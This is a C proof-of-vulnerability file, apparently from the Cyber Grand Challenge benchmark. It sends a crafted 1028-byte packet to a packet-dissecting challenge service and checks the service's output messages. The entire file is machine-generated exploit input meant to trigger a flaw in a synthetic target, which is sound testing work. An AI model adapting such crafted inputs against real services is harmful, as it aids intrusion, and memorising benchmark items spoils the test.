#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\x4f\xe2\x47\x5d"
         "\x01\xb5\x5c\x78\xca\x75\x98\x17\xd5\x8f\x5a\x84\xf3\xd8\xc9\x18"
         "\xa7\x01\x00\x00\x8f\xec\xf6\xb2\x18\x8a\x9e\xd0\xbd\x32\xcc\x35"
         "\x09\x99\xd5\xba\x6e\x6a\x17\xe1\x02\xb7\xc7\x58\x65\xe1\x86\xe2"
         "\xca\xbc\x3d\xf1\x9e\x66\xc8\x0e\x80\x96\x6c\xdd\x52\x96\xed\x97"
         "\x11\x9c\x0d\xcf\x70\xd0\x74\xd8\x89\x20\xff\xee\x58\xed\x34\xc6"
         "\x60\x45\x77\x74\x71\x1b\xb7\xb8\x2a\xf8\xeb\xd5\x3f\xcb\xfd\xf7"
         "\x59\x01\xae\x16\xbe\xf7\x62\xb5\xc8\x51\x60\x8f\x0d\xf1\xa9\xb1"
         "\xa6\xc9\x57\x82\xb7\x87\x18\xfd\x7e\x0c\x96\x73\x8e\x50\xc2\xcc"
         "\x7e\x2a\xd1\x5b\x56\xd7\xb6\x69\xac\xf5\xa8\x7f\xd7\xf5\xd5\xd5"
         "\x2f\xc8\x41\x61\x0d\xad\xad\x4d\x5e\x6e\x57\xa2\x4a\x42\x2a\x91"
         "\xfe\x39\x00\xd9\x66\x32\xb1\xc9\xcd\x6b\x92\x73\xf1\x39\x42\x99"
         "\xcc\x78\xa9\x6a\x85\x1c\x15\x34\x75\xb7\x66\xc1\xa9\x52\x12\xb6"
         "\x33\xb7\x8e\xfd\x90\x97\x44\x0e\x11\xc6\x83\xc9\x21\x6f\xe3\x12"
         "\xdd\x27\xd5\x3c\x2e\x34\xa7\x7d\x39\x00\x72\xff\x00\x6a\x2e\x70"
         "\x35\xe5\xd9\x78\x10\x25\x69\x3c\x0b\x85\x8b\x9c\x28\x8d\xf3\xc8"
         "\x46\x0b\xa7\x76\x2f\x0c\xd8\x82\xdb\x28\x04\x04\xd8\x27\x18\x83"
         "\x3e\xb8\x6f\x63\xd8\xa4\xca\x18\xee\x7e\xae\xa5\x7b\x39\x00\x39"
         "\x00\xe1\xdf\x4e\xd9\xbe\xc8\x47\x33\x77\x27\xdb\xf2\x1c\x43\x1e"
         "\x56\xb9\x1d\x67\xec\xea\x26\xca\xdf\x7f\x09\x74\x0e\x6e\xc4\x09"
         "\x7f\xc0\xd1\xc7\x26\x82\x97\x3c\x41\x2b\xfa\xc0\x22\xb8\xb2\xb7"
         "\xa8\x72\xf8\xf6\xfc\x52\xa7\x60\x7e\xc7\x43\x85\x88\x9f\x69\x75"
         "\xad\x80\x25\xbb\x7b\x94\xdd\x38\xba\xcc\x13\x0c\x6b\x09\x78\xe9"
         "\x6a\x19\x93\x9f\x40\xd9\x0a\x43\x02\xa8\xbe\x87\xad\x5c\xe0\xef"
         "\xff\xed\x6c\xb0\x89\xed\x64\x47\x0b\x6c\x37\x54\x9f\xfa\x1c\x3a"
         "\xac\xd8\x45\xa4\x6f\x71\xf5\xa8\xbb\x9b\x0a\xb1\x3f\x29\x77\xd2"
         "\x93\xb8\x0d\xd9\xff\x47\x03\x3a\x13\xad\xb8\x8b\xd7\xbc\x4b\x54"
         "\xac\xea\x6f\x1f\xbe\x52\x5c\x2c\xbe\x4a\xfb\x36\xe8\x00\x04\x64"
         "\xd8\xe3\x5e\x15\x69\xce\xaa\x0d\x1a\x6e\x6f\x6a\xa8\xe2\x01\x1c"
         "\x82\x7b\x1f\xe6\x63\x7a\x1c\x9b\xb5\xbc\x10\x89\x5e\xcb\x35\xf6"
         "\x9c\xdd\xf7\x40\x22\x31\x68\x10\x33\xee\x82\x06\x23\x8a\xf1\x7f"
         "\xb7\x99\x26\x0e\x9d\x3a\xc9\x04\x30\xa2\x07\xbc\x25\xb7\xf3\x38"
         "\x1e\x79\xab\x59\xd4\x39\xf6\x70\x3c\xf8\xb7\x39\x0b\x90\xa1\x72"
         "\x1d\x82\xed\x3b\xa2\x36\xc1\x91\x60\xa7\xe8\xbc\x66\xe6\xbd\x81"
         "\x39\x00\xca\xc0\x08\x76\xea\x2d\x41\xf5\x33\x36\x05\x63\x53\x60"
         "\x7e\xb8\xbf\x0f\x39\x39\x39\x00\x8b\xd4\x24\xe2\x12\xcf\xe6\xfc"
         "\x64\xbc\xf6\x86\xf2\x5e\x6b\x56\x93\x01\xac\xff\x6e\x37\x01\x8f"
         "\x02\x0e\x8c\x3b\xeb\x6f\xb1\xa7\xd7\x86\x44\xb9\xfa\x28\x6b\x4c"
         "\x1b\xa2\xb8\x1e\x36\x5f\x92\x88\x9f\x04\x86\x27\x2e\x95\x4c\xf6"
         "\x12\x4b\x3c\x22\x83\x28\x38\x2b\xb2\x76\x85\xa5\x4d\x6e\x74\x95"
         "\xa8\xe1\x69\xfb\x5d\x18\x8b\x80\xcf\xee\xe5\x59\x8e\x73\x37\xdc"
         "\x4e\xdc\xb6\x3f\xbd\x14\xfc\x33\x22\x53\x70\xab\x0a\x03\x6d\x71"
         "\xfc\xdb\x31\x0a\x62\xc3\x8c\x6a\x33\x64\x65\xcc\x9e\xf7\xfe\x3a"
         "\xb8\xd8\x5e\x8a\xbc\xf4\x70\xc0\x06\x2e\xb0\xc0\xe4\x66\x1b\x8f"
         "\xaf\xb3\xd5\x4d\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===rofl
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x72\x6f\x66\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===camphyleneremarkedly
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x63\x61\x6d\x70\x68\x79\x6c\x65\x6e\x65\x72"
         "\x65\x6d\x61\x72\x6b\x65\x64\x6c\x79";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
